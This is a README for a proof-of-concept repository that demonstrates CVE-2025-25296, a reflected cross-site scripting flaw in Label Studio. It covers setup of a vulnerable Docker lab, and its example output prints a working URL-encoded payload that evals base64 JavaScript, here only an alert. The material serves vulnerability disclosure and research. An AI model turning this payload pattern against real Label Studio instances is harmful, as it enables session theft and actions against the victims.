# CVE-2025-25296 Proof of Concept (POC)

## Description

This project demonstrates a Proof of Concept (POC) for the CVE-2025-25296 vulnerability affecting Label Studio, an open-source data labeling tool. The vulnerability resides in the `/projects/upload-example` endpoint, which fails to sanitize user-provided HTML content in GET requests. This allows attackers to execute arbitrary JavaScript in the victim's browser, leading to potential Cross-Site Scripting (XSS) attacks.

## Vulnerability Details

- **Affected Component**: `/projects/upload-example` endpoint of Label Studio
- **Impact**: Cross-Site Scripting (XSS)
- **Root Cause**: Improper sanitization of user-provided HTML content in GET requests
- **Exploitation**: Crafting a malicious URL containing a specially formatted XML label config with embedded JavaScript
- **Mitigation**: Update to Label Studio version `1.16.0` or later

## Workaround

As a temporary workaround:
1. Avoid using the `/projects/upload-example` endpoint with GET requests.
2. Prefer POST requests for uploading configurations.

## Requirements

- Python 3.x
- Docker
- Required Python packages (installed via `pip` using `setup.sh`)

## Files

- `poc.py`: Python script to exploit the vulnerability and demonstrate the XSS attack.
- `setup.sh`: Script to set up the vulnerable environment using Docker.

## Setup Instructions

1. Clone this repository:
    ```bash
    git clone CVE-2025-25296-POC
    cd CVE-2025-25296-POC
    ```

2. Run the setup script:
    ```bash
    chmod +x setup.sh
    ./setup.sh
    ```

3. The setup script will:
    - Check for Docker installation.
    - Install required Python packages.
    - Pull the vulnerable Label Studio Docker image (`1.15.0`).
    - Run the vulnerable Label Studio instance on `localhost:8080`.
    - Create an account on http://localhost:8080

## Exploitation

1. Run the exploit script:
    ```bash
    python poc.py
    ```

2. The script will:
    - Send a crafted GET request to the vulnerable `/projects/upload-example` endpoint.
    - Output a URL with the payload.

3. Open the provided URL in a web browser to observe the XSS alert triggered by the payload.

## Example Output

```text
[*] Attempting to send XSS payload...
[+] Payload successfully sent!
[+] Check this URL in a browser: http://localhost:8080/projects/upload-example/?label_config=%3CView%3E%3C!--%20%7B%22data%22%3A%20%7B%22text%22%3A%20%22%3Cdiv%3E%3Cimg%20src%3Dx%20onerror%3Deval(atob(%60YWxlcnQoIlhTUyIp%60))%3E%3C/div%3E%22%7D%7D%20--%3E%3CHyperText%20name%3D%22text%22%20value%3D%22%24text%22/%3E%3C/View%3E
```

## Mitigation Recommendations

To mitigate this vulnerability:
1. Update Label Studio to version `1.16.0` or later.
2. Enable a strict Content Security Policy (CSP) to block script execution.

## Disclaimer

This project is intended for educational and research purposes only. Use it responsibly and only on systems where you have explicit permission. Unauthorized use of this tool may violate applicable laws.

## References

- [Label Studio GitHub Repository](https://github.com/heartexlabs/label-studio)
- [CVE-2025-25296 Details](https://cve.mitre.org/)

